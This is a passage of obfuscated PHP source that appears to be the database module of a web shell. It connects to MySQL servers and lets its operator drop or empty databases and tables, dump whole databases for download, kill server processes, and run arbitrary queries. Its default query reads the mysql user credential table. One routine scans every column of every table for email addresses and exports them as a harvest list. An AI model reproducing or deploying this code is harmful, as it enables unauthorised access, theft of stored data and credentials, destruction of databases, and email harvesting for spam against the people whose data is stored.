z3q((@isset($table_table)?array($db_table,$table_table):$db_table)); if($sql_act=="dropdb"){ echo z6s(); echo z10w(z7u(z6l(z7n(z9y("437",$sql_db)).z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"db_act","db_act"=>"drop","sql_db","drop_confirm"=>"1"),z8b(z9y("21"),"7")).z9x().z5x($back_form_actions,z8b(z9y("22"),'7')))),"2"); echo z6s(); } elseif($sql_act=="droptable"){ echo z6s(); echo z10w(z7u(z6l(z7n(z9y("438",$sel_table)).z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"table_act","table_act"=>"drop","sql_db","sel_table","drop_confirm"=>"1"),z8b(z9y("21"),"7")).z9x().z5x($back_form_actions,z8b(z9y("22"),'7')))),"2"); echo z6s(); } elseif($sql_act=="empty"){ echo z6s(); echo z10w(z7u(z6l(z7n(z9y("439",$sel_table)).z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"table_act","table_act"=>"empty","sql_db","sel_table","empty_confirm"=>"1"),z8b(z9y("21"),"7")).z9x().z5x($back_form_actions,z8b(z9y("22"),'7')))),"2"); echo z6s(); } elseif($sql_act=="dump"){ if(!@isset($dump_filename)) $dump_filename=$tempdir."dump_".@getenv("SERVER_NAME")."_db_".@date("d-m-Y_H-i-s").".sql"; if(@isset($sql_db)&&!@empty($sql_db)){ $sql->base=$sql_db; if($sql->select_db()){ $table_list=array(); $sql->query('SHOW TABLES FROM '.$sql_db.';'); if($sql->get_result()){ for($i=0;$i<$sql->num_rows;$i++){ foreach($sql->rows[$i] as $rk=>$rv){ $table_list[]=$rv; } } } } } if(!@isset($sql_tables)||@empty($sql_tables)){ if(@isset($sel_table)&&!@empty($sel_table)){ $sql_tables=$sel_table; } else { $sql_tables=(@count($table_list)>0?@implode(",",$table_list):""); } } elseif(@isset($table_list)&&@is_array($table_list)) { $tmp_tables=@explode(",",$sql_tables); $sql_tables=""; foreach($tmp_tables as $tmp_table){ $tmp_table=@trim($tmp_table); if(@in_array($tmp_table,$table_list)){ $sql_tables.=$tmp_table.","; } else { break; } } if(@empty($sql_tables)) $sql_tables=@implode(",",$table_list); } echo z3q(z9y("440")); echo z9m("2").z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"dump","dump_confirm"=>"1"), z5b(). z7u(z5t(z9y("441")).z9c(z3m("sql_db",$db_list,"7",1))). z7u(z5t(z9y("442")).z9c(z5w("sql_tables","5").(@isset($sql_tables)?@htmlspecialchars($sql_tables):"").z5q())). z7u(z5t(z9y("443")).z9c(z5y("dump_filename",$dump_filename,"7"))). z7u(z5t(z9x()).z9c(z5u("sql_save2file",z9y("444"),"sql_save2file").z9x().z5u("sql_download",z9y("445"),"sql_download"))). z7u(z5t(z9x()).z9c(z8b(z9y("446"),"7"))). z5b()). z10q(); if(@isset($dump_confirm)&&$dump_confirm){ $fp=0; if(@isset($sql_save2file)&&$sql_save2file=="1"&&@isset($dump_filename)&&!@empty($dump_filename)){ $fp=@fopen($dump_filename,"w"); } $dumping_arr=array(); $tmp_tables=@explode(",",$sql_tables); foreach($tmp_tables as $tmp_table){ $tmp_table=@trim($tmp_table); $dumping_arr[]=$tmp_table; } $dumping_arr=@array_unique($dumping_arr); $sql->base=$sql_db; if(!$sql->select_db()){ echo z3q(z9y("447")); }elseif(@count($dumping_arr)<1){ echo z3q(z9y("448")); }else{ $sql_dumped=""; foreach($dumping_arr as $dump_table){ if($sql->dump($dump_table)){ foreach($sql->dump as $v) $sql_dumped.=$v."\r\n"; } } if($sql_dumped!=""){ if(@isset($sql_download)&&$sql_download=="1"){ @ob_clean(); @header("Content-type: application/octet-stream"); @header("Content-length: ".@strlen($sql_dumped)); @header("Content-disposition: attachment; filename=\"".@basename($dump_filename)."\";"); echo $sql_dumped; exit(); } if(!@isset($sql_save2file)||$sql_save2file!="1"){ echo z9m('2').z6f().z6q().z5w('','1').@htmlspecialchars($sql_dumped).z5q().z7f().z7y().z10q().z6s(); }elseif($fp||@function_exists('file_put_contents')){ if(@fwrite($fp,$sql_dumped) or @fputs($fp,$sql_dumped) or @file_put_contents($dump_filename,$sql_dumped)){ echo z3q(z9y("449",$dump_filename)); }else{ echo z3q(z9y("450")); } }else{ echo z3q(z9y("450")); } } } } } if($sql_act=="table_act"&&@isset($table_act)&&($table_act=="browse"||$table_act=="insert")&&@isset($sel_table)&&!@empty($sel_table)){ $crows=$sql->count_rows($sel_table); $sql->parse_fields($sel_table); $cfields=$sql->num_fields; $fields=$sql->columns; if($table_act=="insert"){ if(@isset($sql_tbl_insert_radio)&&!@empty($sql_tbl_insert_radio)){ if($sql_tbl_insert_radio==1){ $keys=""; $akeys=@array_keys($sql_tbl_insert); foreach($akeys as $v){ $keys.="`".@addslashes($v)."`, "; } if(!@empty($keys)){ $keys=@substr($keys,0,@strlen($keys)-2); } $values=""; $i=0; foreach(@array_values($sql_tbl_insert) as $v){ if($funct=$sql_tbl_insert_functs[$akeys[$i]]){ $values.=$funct." ("; } $values.="'".@addslashes($v)."'"; if($funct){ $values.=")"; } $values.=", "; $i++; } if(!@empty($values)){ $values=@substr($values,0,@strlen($values)-2); } $sql->query("INSERT INTO `".$sel_table."` ( ".$keys." ) VALUES ( ".$values." );"); }elseif($sql_tbl_insert_radio==2){ $set=z0k($sql_tbl_insert,", ",$sql_tbl_insert_functs); $sql->query("UPDATE `".$sel_table."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;"); } $table_act="browse"; }else{ echo z3q(array("INSERT INTO TABLE ".$sel_table),"1"); if(!@isset($sql_tbl_insert)||!@is_array($sql_tbl_insert)){ $sql_tbl_insert=array(); } if(!@empty($sql_tbl_insert_q)){ $sql->query("SELECT * FROM `".$sel_table."` WHERE ".$sql_tbl_insert_q." LIMIT 1;"); $values=@mysql_fetch_assoc($sql->res); @mysql_free_result($sql->res); }else{ $values=array(); } echo z9k().z9v("act","sql").z9v("sql_server").z9v("sql_user").z9v("sql_pass").z9v("sql_port").z9v("sql_engine").z9v("d").z9v("sql_act","table_act").z9v("table_act","insert").z9v("sel_table").z9v("sql_db").z9v("sql_tbl_insert_q").z9m("2").z7u(z9c("Field","13","2").z9c("Type","13").z9c("Function","13").z9c("Value","13","3")); $sql->query("SHOW FIELDS FROM `".$sel_table."`;"); $sql->get_result(); for($i=0; $i < $sql->num_rows; $i++){ $field=$sql->rows[$i]; $name=$field["Field"]; if(empty($sql_tbl_insert_q)){ $v=""; } echo z9d(z9c(z7n(@htmlspecialchars($name)),"14","2").z9c($field["Type"],"14").z9c(z3m("sql_tbl_insert_functs[".@htmlspecialchars($name)."]",array( ""=>"", "PASSWORD"=>"PASSWORD", "MD5"=>"MD5", "ENCRYPT"=>"ENCRYPT", "ASCII"=>"ASCII", "CHAR"=>"CHAR", "RAND"=>"RAND", "LAST_INSERT_ID"=>"LAST_INSERT_ID", "COUNT"=>"COUNT", "AVG"=>"AVG", "SUM"=>"SUM", " "=>"--------", "SOUNDEX"=>"SOUNDEX", "LCASE"=>"LCASE", "UCASE"=>"UCASE", "NOW"=>"NOW", "CURDATE"=>"CURDATE", "CURTIME"=>"CURTIME", "FROM_DAYS"=>"FROM_DAYS", "FROM_UNIXTIME"=>"FROM_UNIXTIME", "PERIOD_ADD"=>"PERIOD_ADD", "PERIOD_DIFF"=>"PERIOD_DIFF", "TO_DAYS"=>"TO_DAYS", "UNIX_TIMESTAMP"=>"UNIX_TIMESTAMP", "USER"=>"USER", "WEEKDAY"=>"WEEKDAY", "CONCAT"=>"CONCAT"),"5"),"14").z9c(z6u("sql_tbl_insert[".(@isset($name)?@htmlspecialchars($name):"")."]",(@isset($values["$name"])?@htmlspecialchars($values["$name"]):""),"7"),"14","3"),($i%2?'0':'1')); } echo z10q(); $iradio='<input type="radio" id="insert" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="1"'.(@empty($sql_tbl_insert_q)?" checked":"").'><label for="insert">'.z9y("405").'</label>'; if(!@empty($sql_tbl_insert_q)){ $iradio .= z9x().z9y("406").z9x().'<input type="radio" id="save" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="2" checked><label for="save">'.z9y("407").'</label>'; $iradio .= z9v("sql_tbl_insert_q",@htmlspecialchars($sql_tbl_insert_q)); } echo z3q($iradio.z9x("3").z8b(z9y("408"),"7")); echo z9l(); } } if($table_act=="browse"){ if(!@isset($sql_from)||!@is_numeric($sql_from)) $sql_from=0; if(!@isset($sql_limit)||!@is_numeric($sql_limit)) $sql_limit=50; if(!@isset($sql_page)||!@is_numeric($sql_page)) $sql_page=0; $psql_sort=z5r($sql_sort); if($psql_sort[1]!='a'){ $psql_sort[1]='d'; } else { $psql_sort[1]='a'; } if($psql_sort[0]>($cfields-1)) $psql_sort[0]='0'; $v=$psql_sort[0]; if($crows>$sql_limit){ $pages=@ceil($crows/$sql_limit); $tmpsort=""; if(@is_array($fields)&&@isset($fields[$psql_sort[0]])){ $tmpsort=' ORDER BY `'.$fields[$psql_sort[0]].'` '.($psql_sort[1]=="a"?'ASC':'DESC'); } $table_limit=$tmpsort.' LIMIT '.($sql_limit*$sql_page).','.$sql_limit; } else { $table_limit=''; $pages=0; } $ar_pages=array(); for($i=0; $i<$pages; $i++){ $ar_pages[$i]=z9y("397")." ".($i+1); } if(@count($ar_pages)<1) $ar_pages=array("0"=>z9y("397")." 1"); echo z3q(array(z9y("395",array($sel_table,$cfields,$crows)),z10w(z9d(z6z(($sql_page>0 ? z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","table_act","sql_db","sel_table","sql_page"=>($sql_page=="1"?"NULL":($sql_page-1))),z8b(z9y("396"),"7")) : z8b(z9y("396"),"7")). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","table_act","sql_db","sel_table"),z3m("sql_page",$ar_pages,"1",1).z8b(z9y("398"),"7")). ($sql_page<($pages-1) ? z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","table_act","sql_db","sel_table","sql_page"=>($sql_page+1)),z8b(z9y("399"),"7")) : z8b(z9y("399"),"7")))),"2")),"1"); $sql->query('SELECT * FROM '.$sel_table.$table_limit.';'); if($sql->get_result()){ echo z9m('2').z7o().z7j().z5z('',"0").z9m("2").z7o().z7j(); echo z9m('2'); echo z6f(); for($i=0;$i<@count($sql->columns);$i++){ echo ($i==0?z9c(z9y("62"),"13","2"):"").z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","table_act","sql_db","sel_table","sql_page","sql_sort"=>($psql_sort[0]=="$i"?"$i".($psql_sort[1]=="a"?"d":"a"):"$i".$psql_sort[1])),z8b($sql->columns[$i].($psql_sort[0]=="$i"?' '.($psql_sort[1]=="a"?'&uarr;':'&darr;'):''),'3')),"13",($i==(@count($sql->columns)-1)?'3':'')); } echo z7y(); $print_arr=array(); for($i=0;$i<$sql->num_rows;$i++){ if(@is_array($sql->rows[$i])){ $tmparr=array(); foreach($sql->rows[$i] as $rk=>$rv){ $tmparr[]=$rv; } $print_arr[]=$tmparr; } } @usort($print_arr,"z2b"); if($psql_sort[1]=="d"){ $print_arr=@array_reverse($print_arr); } for($i=0;$i<@count($print_arr);$i++){ echo z6f(($i%2?'0':'1')); $cr=0; foreach($print_arr[$i] as $rv){ $w=""; for($a=0;$a<$sql->num_fields;$a++){ $w.=" `".$sql->columns[$a]."` = '".@addslashes($print_arr[$i][$a])."' AND"; } if($a>0) $w=@substr($w,0,@strlen($w)-3); echo ($cr==0?z9c("<nobr>".z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"table_act","sql_db","sel_table","sql_tbl_insert_q"=>$w),z3m("table_act",array("insert"=>"Edit","delete"=>"Delete"),"3").z8b("&raquo;","6"))."</nobr>","14","28"):"").z9c((@is_null($rv)?'NULL':@htmlspecialchars($rv)),"14",($cr==(@count($print_arr[$i])-1)?'3':'')); $cr++; } echo z7y(); } echo z10q().z7f().z7y().z10q().z5h().z7f().z7y().z10q(); } } } elseif($sql_act=="db_act"&&@isset($db_act)&&$db_act=="select"&&@isset($sql_db)&&!@empty($sql_db)) { echo z3q(z9y("366",$sql_db),"1"); $sql->query('SHOW TABLE STATUS;'); if($sql->get_result()){ $psql_sort=z5r($sql_sort); if($psql_sort[1]!='a'){ $psql_sort[1]='d'; } else { $psql_sort[1]='a'; } if($psql_sort[0]>=$sql->num_fields) $psql_sort[0]='0'; $v=$psql_sort[0]; echo z9m('2').z7o().z7j().z5z('',"0").z9m("2").z7o().z7j(); echo z9m('2').z6f(); for($i=0;$i<$sql->num_fields;$i++){ echo z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","db_act","sql_db","sel_table","sql_page","sql_sort"=>($psql_sort[0]=="$i"?"$i".($psql_sort[1]=="a"?"d":"a"):"$i".$psql_sort[1])),z8b(($i==0?"Table ":"").$sql->columns[$i].($psql_sort[0]=="$i"?' '.($psql_sort[1]=="a"?'&uarr;':'&darr;'):''),'3')),"13",($i==0?"2":($i==($sql->num_fields-1)?'3':''))).($i==0?z9c(z9y("369"),"13","8"):''); } echo z7y(); $print_arr=array(); for($i=0;$i<$sql->num_rows;$i++){ if(@is_array($sql->rows[$i])){ $tmparr=array(); foreach($sql->rows[$i] as $rk=>$rv){ $tmparr[]=$rv; } $print_arr[]=$tmparr; } } @usort($print_arr,"z2b"); if($psql_sort[1]=="d"){ $print_arr=@array_reverse($print_arr); } for($i=0;$i<@count($print_arr);$i++){ echo z6f(($i%2?'0':'1')); $cr=0; foreach($print_arr[$i] as $rv){ echo z9c((@is_null($rv)?'NULL':($cr==0? "<nobr>".z5x(array("act"=>"sql","sql_server","sql_user","sql_pass","sql_port","sql_engine","d","sql_act"=>"table_act","sql_db","sel_table"=>$rv,"table_act"=>"browse"),z8b($rv,"11"))."</nobr>" :@htmlspecialchars($rv))),"14",($cr==0?'2':($cr==(@count($print_arr[$i])-1)?'3':''))); if($cr==0) echo z9c("<nobr>".z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"table_act","sql_db","sel_table"=>$rv),z3m("table_act",$table_actions,"3").z8b("&raquo;","6"))."</nobr>","14","8"); $cr++; } echo z7y(); } echo z10q().z7f().z7y().z10q().z5h().z7f().z7y().z10q(); } } } if($sql_act=="query"){ echo z3q(z9y("370")); echo z9m("2").z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"query","query_confirm"=>"1"), z5b(). z7u(z5t(z9y("364")).z9c(z5y("sql_db","","7"))). z9d(z5t(z9y("370")).z9c(z5w("sql_query","5").(@isset($sql_query)?@htmlspecialchars($sql_query):"").z5q())). z7u(z5t(z9x()).z9c(z8b(z9y("371"),"7"))). z5b()). z10q(); if(@isset($query_confirm)&&$query_confirm){ if(@isset($sql_db)&&!@empty($sql_db)){ $sql->base=$sql_db; if(!$sql->select_db()){ echo z3q(z9y("447")); } } $q_sql_error=''; $q_sql_result=''; if(@strlen($sql_query)>5){ $q_sql_result.=z3q(z9y("394")); switch($sql->query($sql_query)){ case '0': $q_sql_result.=z3q("ERROR : ".$sql->error); break; case '1': if($sql->get_result()){ $q_sql_result.=z9m('2').z7o().z7j().z5z('',"0").z9m("2").z7o().z7j(); foreach($sql->columns as $k=>$v) $sql->columns[$k]=@htmlspecialchars($v,ENT_QUOTES); $keys=""; $count_keys=@count($sql->columns); $key_num=0; foreach($sql->columns as $column){ if($key_num==0){ $keys.=z9c($column,"13", "02"); } elseif($key_num==($count_keys-1)){ $keys.=z9c($column,"13", "03"); }else{ $keys.=z9c($column,"13","0"); } $key_num++; } $q_sql_result.=z7u($keys); for($i=0;$i<$sql->num_rows;$i++){ foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k]=@htmlspecialchars($v,ENT_QUOTES); $values=""; $count_values=@count($sql->rows[$i]); $value_num=0; foreach($sql->rows[$i] as $row){ if($value_num==0){ $values.=z9c($row,"14","2"); }elseif($value_num==($count_values-1)){ $values.=z9c($row,"14","3"); }else{ $values.=z9c($row,"14"); } $value_num++; } $q_sql_result.=z7u($values,($i%2?'0':'1')); } $q_sql_result.=z7f().z7y().z10q().z5h().z7f().z7y().z10q(); } break; case '2': $ar=$sql->affected_rows()?($sql->affected_rows()):('0'); $q_sql_result.=z3q("AFFECTED ROWS: ".$ar); break; } } if($q_sql_result!=''){ echo $q_sql_result; $q_sql_result=''; } } } if($sql_act=="emails"){ $emails=array(); if(!@isset($emails_filename)) $emails_filename=$tempdir."emails_".@getenv("SERVER_NAME")."_db_".@date("d-m-Y_H-i-s").".txt"; if(@isset($sql_db)&&!@empty($sql_db)){ $sql->base=$sql_db; if($sql->select_db()){ $table_list=array(); $sql->query('SHOW TABLES FROM '.$sql_db.';'); if($sql->get_result()){ for($i=0;$i<$sql->num_rows;$i++){ foreach($sql->rows[$i] as $rk=>$rv){ $table_list[]=$rv; } } } } } if(!@isset($sql_tables)||@empty($sql_tables)){ if(@isset($sel_table)&&!@empty($sel_table)){ $sql_tables=$sel_table; } else { $sql_tables=(@count($table_list)>0?@implode(",",$table_list):""); } } elseif(@isset($table_list)&&@is_array($table_list)) { $tmp_tables=@explode(",",$sql_tables); $sql_tables=""; foreach($tmp_tables as $tmp_table){ $tmp_table=@trim($tmp_table); if(@in_array($tmp_table,$table_list)){ $sql_tables.=$tmp_table.","; } else { break; } } if(@empty($sql_tables)) $sql_tables=@implode(",",$table_list); } echo z3q(z9y("372")); echo z9m("2").z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"emails","dump_confirm"=>"1"), z5b(). z7u(z5t(z9y("364")).z9c(z3m("sql_db",$db_list,"7",1))). z7u(z5t(z9y("373")).z9c(z5w("sql_tables","5").(@isset($sql_tables)?@htmlspecialchars($sql_tables):"").z5q())). z7u(z5t(z9y("374")).z9c(z5y("emails_filename",$emails_filename,"7"))). z7u(z5t(z9x()).z9c(z5u("sql_save2file",z9y("375"),"sql_save2file").z9x().z5u("sql_download",z9y("376"),"sql_download"))). z7u(z5t(z9x()).z9c(z8b(z9y("377"),"7"))). z5b()). z10q(); if(@isset($dump_confirm)&&$dump_confirm){ $fp=0; if(@isset($sql_save2file)&&$sql_save2file=="1"&&@isset($dump_filename)&&!@empty($dump_filename)){ $fp=@fopen($emails_filename,"w"); } $dumping_arr=array(); $tmp_tables=@explode(",",$sql_tables); foreach($tmp_tables as $tmp_table){ $tmp_table=@trim($tmp_table); $dumping_arr[]=$tmp_table; } $dumping_arr=@array_unique($dumping_arr); $sql->base=$sql_db; if(!$sql->select_db()){ echo z3q(z9y("447")); }elseif(@count($dumping_arr)<1){ echo z3q(z9y("448")); }else{ foreach($dumping_arr as $dump_table){ if($sql->parse_fields($dump_table)){ foreach($sql->columns as $ck=>$cv){ if($sql->query("SELECT ".$cv." FROM ".$dump_table." WHERE ".$cv." REGEXP '^[^@]+@[^@]+\.[^@]{2,}$';")){ if($sql->get_result()){ for($i=0; $i< $sql->num_rows; $i++){ $tmpmails=z3k($sql->rows[$i][$cv]); if(@count($tmpmails)>0){ foreach($tmpmails as $mtmp) $emails[]=$mtmp; } } } } } } } $emails=@array_unique($emails); if(@count($emails)>0){ $maildump=@implode("\r\n",$emails); if(@isset($sql_download)&&$sql_download=="1"){ @ob_clean(); @header("Content-type: application/octet-stream"); @header("Content-length: ".@strlen($maildump)); @header("Content-disposition: attachment; filename=\"".@basename($emails_filename)."\";"); echo $maildump; exit(); } if(!@isset($sql_save2file)||$sql_save2file!="1"){ echo z9m('2').z6f().z6q().z5w('','1').@htmlspecialchars($maildump).z5q().z7f().z7y().z10q().z6s(); }elseif($fp||@function_exists('file_put_contents')){ if(@fwrite($fp,$maildump) or @fputs($fp,$maildump) or @file_put_contents($emails_filename,$maildump)){ echo z3q(z9y("449",$emails_filename)); }else{ echo z3q(z9y("450")); } }else{ echo z3q(z9y("450")); } } } } } if($sql_act=="serverstatus"){ echo z3q(z9y("378"),"1"); $sql->query("SHOW STATUS"); if($sql->get_result()){ echo z9m('2').z7u(z9c(z9y("380"),"13","2").z9c(z9y("381"),"13","3")); for($i=0;$i<$sql->num_rows;$i++){ echo z6f(($i%2?'0':'1')); $cr=0; foreach($sql->rows[$i] as $rk=>$rv){ echo z9c($rv,"14",($cr==0?'25':($cr==(@count($sql->rows[$i])-1)?'3':''))); $cr++; } echo z7y(); } echo z10q(); } } if($sql_act=="servervars"){ echo z3q(z9y("379"),"1"); $sql->query("SHOW VARIABLES"); if($sql->get_result()){ echo z9m('2').z7u(z9c(z9y("380"),"13","2").z9c(z9y("381"),"13","3")); for($i=0;$i<$sql->num_rows;$i++){ echo z6f(($i%2?'0':'1')); $cr=0; foreach($sql->rows[$i] as $rk=>$rv){ echo z9c($rv,"14",($cr==0?'25':($cr==(@count($sql->rows[$i])-1)?'3':''))); $cr++; } echo z7y(); } echo z10q(); } } if($sql_act=="processes"){ if(@isset($kill)&&!@empty($kill)){ $query="KILL ".$kill.";"; $sql->query($query); echo z3q(z9y("393",$kill),"1"); } else { echo z3q(z9y("382"),"1"); } $sql->query("SHOW PROCESSLIST;"); if($sql->get_result()){ echo z9m('2').z7u(z9c(z9y("383"),"13","2").z9c(z9y("384"),"13").z9c(z9y("385"),"13").z9c(z9y("386"),"13").z9c(z9y("387"),"13").z9c(z9y("388"),"13").z9c(z9y("389"),"13").z9c(z9y("390"),"13").z9c(z9y("391"),"13","3")); for($i=0;$i<$sql->num_rows;$i++){ echo z6f(($i%2?'0':'1')); $cr=0; $pid=''; foreach($sql->rows[$i] as $rk=>$rv){ echo z9c($rv,"14",($cr==0?'5':'')); if($cr==0) $pid=$rv; $cr++; } echo z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"processes","kill"=>$pid),z8b(z9y("392"),"7")),"14"); echo z7y(); } echo z10q(); } } if($sql_act=="showdb"){ $psql_sort=z5r($sql_sort); if($psql_sort[1]!='a') $psql_sort[1]='d'; if($psql_sort[0]>2) $psql_sort[0]='0'; $v=$psql_sort[0]; echo z3q(z9y("359"),"1"); echo z9m('2'); echo z7u( z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_sort"=>($psql_sort[0]=='0'?'0'.($psql_sort[1]=="a"?"d":"a"):'0'.$psql_sort[1])),z8b(z9y("360").($psql_sort[0]=='0'?' '.($psql_sort[1]=="a"?'&uarr;':'&darr;'):''),'3')),"13","2"). z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_sort"=>($psql_sort[0]=='1'?'1'.($psql_sort[1]=="a"?"d":"a"):'1'.$psql_sort[1])),z8b(z9y("361").($psql_sort[0]=='1'?' '.($psql_sort[1]=="a"?'&uarr;':'&darr;'):''),'3')),"13"). z9c(z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_sort"=>($psql_sort[0]=='2'?'2'.($psql_sort[1]=="a"?"d":"a"):'2'.$psql_sort[1])),z8b(z9y("362").($psql_sort[0]=='2'?' '.($psql_sort[1]=="a"?'&uarr;':'&darr;'):''),'3')),"13"). z9c(z9y("363"),"13","3") ); if(@count($db_list)>1){ $def_db=$sql->base; $total_tables=0; $total_size=0; $print_arr=array(); foreach($sql->list_dbs() as $k=>$kv){ $sql->base=$k; $tables="0"; $size="0"; if($sql->select_db()){ $sql->query("SHOW TABLES;"); if($sql->get_result()) $tables=$sql->num_rows; $sql->query("SELECT round(data_length + index_length) FROM information_schema.TABLES WHERE table_schema = \"".$k."\";"); if($sql->get_result()) $size=@implode('',$sql->rows[0]); } $print_arr[]=array($k,$size,$tables); $total_tables+=$tables; $total_size+=$size; } $sql->base=$def_db; $sql->select_db(); } if(@count($print_arr)>0){ $count=0; @usort($print_arr,"z2b"); if($psql_sort[1]=="d"){ $print_arr=@array_reverse($print_arr); } foreach($print_arr as $ar){ echo z7u(z9c(z5x(array("act"=>"sql","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"db_act","db_act"=>"select","d","sql_db"=>$ar[0]),z8b($ar[0],"11")),"14","2").z9c(z7x($ar[1]),"14").z9c($ar[2],"14").z9c("<nobr>".z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"db_act","sql_db"=>$ar[0]),z3m("db_act",$db_actions,"3").z8b("&raquo;","6"))."</nobr>","14","38"),($count%2?'0':'1')); $count++; } echo z7u(z9c(z7n(z9y("409",$count)),"13","2").z9c(z7x($total_size),"13").z9c($total_tables,"13").z9c(z9x(),"13","3")); } echo z10q(); } } } else { $hmsg=z9y("191"); } } if(!$hideconnect){ if(!@isset($q_sql_query)) $q_sql_query="SHOW DATABASES;\nSELECT * FROM user;"; if(!@isset($q_sql_filename)) $q_sql_filename=$tempdir."dump_".@getenv("SERVER_NAME")."_db_".@date("d-m-Y_H-i-s").".sql"; $available_arr=array(); if($bmysql) $available_arr["MySQL"]="MySQL"; if($bmssql) $available_arr["MSSQL"]="MSSQL"; if($bpostgres) $available_arr["PostgreSQL"]="PostgreSQL"; if($boracle) $available_arr["Oracle"]="Oracle"; echo z3q(z9y("451").($hmsg!=''?' : '.$hmsg:'')); echo z9m('2'). z5x(array("act"=>"sql","d"), z5b(). z7u(z6z(z7n(z9y("452"))).z7k(z5y("sql_server","127.0.0.1","4").":".z5y("sql_port","3306","1")).z6z(z7n(z9y("453"))).z7k(z5y("sql_user","root","4")).z6z(z7n(z9y("454"))).z7k(z5y("sql_pass","","4")).z6z(z7n(z9y("455"))).z7k(z5y("sql_db","","4")).z6z(z7n(z9y("456"))).z7k(z3m("sql_engine",array("MySQL"=>"MySQL"),"4",1).z8b(z9y("457"),"7"))) ). z10q(); echo z6s(); echo z3q(array(z9y("410"),z9y("420")),'46'); echo z9m('2'). z9d( z9c( z5x(array("act"=>"sql","d","q_sql_action"=>"dump"), z9m(). z5b(). z7u(z5t(z9y("411")).z9c(z3m("q_sql_engine",$available_arr,"4",1))). z7u(z5t(z9y("412")).z9c(z5y("q_sql_server","127.0.0.1",'4').":".z5y("q_sql_port","3306","1"))). z7u(z5t(z9y("413")).z9c(z5y("q_sql_user","root","4").":".z5y("q_sql_pass","","4"))). z7u(z5t(z9y("414")).z9c(z5y("q_sql_db","mysql","4").".".z5y("q_sql_table","user","4"))). z7u(z5t(z9y("415")).z9c(z5y("q_sql_filename",$q_sql_filename,"8"))). z7u(z5t(z9x()).z9c(z5u("q_sql_download",z9y("416"),"q_sql_download"))). z7u(z5t(z9x()).z9c(z5u("q_sql_save2file",z9y("417"),"q_sql_save2file"))). z7u(z5t(z9x()).z9c(z8b(z9y("418"),"7"))). z5b(). z10q() ) ,'','4'). z9c( z5x(array("act"=>"sql","d","q_sql_action"=>"query"), z9m(). z5b(). z7u(z5t(z9y("411")).z9c(z3m("q_sql_engine",$available_arr,"4",1))). z7u(z5t(z9y("412")).z9c(z5y("q_sql_server","127.0.0.1","4").":".z5y("q_sql_port","3306","1"))). z7u(z5t(z9y("413")).z9c(z5y("q_sql_user","root","4").":".z5y("q_sql_pass","","4"))). z7u(z5t(z9y("421")).z9c(z5y("q_sql_db","mysql","4"))). z9d(z5t(z9y("370")).z9c(z5w("q_sql_query","4").@htmlspecialchars($q_sql_query).z5q())). z7u(z5t(z9x()).z9c(z8b(z9y("422"),"7"))). z5b(). z10q() ) ,'',"46") ). z10q(); if(@isset($q_sql_action)&&$q_sql_action=="query"){ $sql=new my_sql(); $sql->db=$q_sql_engine; $sql->host=$q_sql_server; $sql->port=$q_sql_port; $sql->user=$q_sql_user; $sql->pass=$q_sql_pass; $sql->base=$q_sql_db; $querys=@explode(';',$q_sql_query); $q_sql_connect_error=""; $q_sql_error=''; $q_sql_result=''; if(!$sql->connect()) $q_sql_connect_error=z3q(z9y("419")); else{ if(!empty($sql->base)&&!$sql->select_db()) $q_sql_connect_error=z3q(z9y("447")); else{ foreach($querys as $num=>$query){ if(@strlen($query)>5){ $q_sql_result.=z3q(z9y("423", array($num,@htmlspecialchars($query,ENT_QUOTES)))); switch($sql->query($query)){ case '0': $q_sql_result.=z3q("ERROR : ".$sql->error); break; case '1': if($sql->get_result()){ $q_sql_result.=z9m('2').z7o().z7j().z5z('',"0").z9m("2").z7o().z7j(); foreach($sql->columns as $k=>$v) $sql->columns[$k]=@htmlspecialchars($v,ENT_QUOTES); $keys=""; $count_keys=@count($sql->columns); $key_num=0; foreach($sql->columns as $column){ if($key_num==0){ $keys.=z9c($column,"13", "02"); }elseif($key_num==($count_keys-1)){ $keys.=z9c($column,"13", "03"); }else{ $keys.=z9c($column,"13","0"); } $key_num++; } $q_sql_result.=z7u($keys); for($i=0;$i<$sql->num_rows;$i++){ foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k]=@htmlspecialchars($v,ENT_QUOTES); $values=""; $count_values=@count($sql->rows[$i]); $value_num=0; foreach($sql->rows[$i] as $row){ if($value_num==0){ $values.=z9c($row,"14","2"); }elseif($value_num==($count_values-1)){ $values.=z9c($row,"14","3"); }else{ $values.=z9c($row,"14"); } $value_num++; } $q_sql_result.=z7u($values,($i%2?'0':'1')); } $q_sql_result.=z7f().z7y().z10q().z5h().z7f().z7y().z10q(); } break; case '2': $ar=$sql->affected_rows()?($sql->affected_rows()):('0'); $q_sql_result.=z3q("AFFECTED ROWS: ".$ar); break; } } if($q_sql_result!=''){ echo 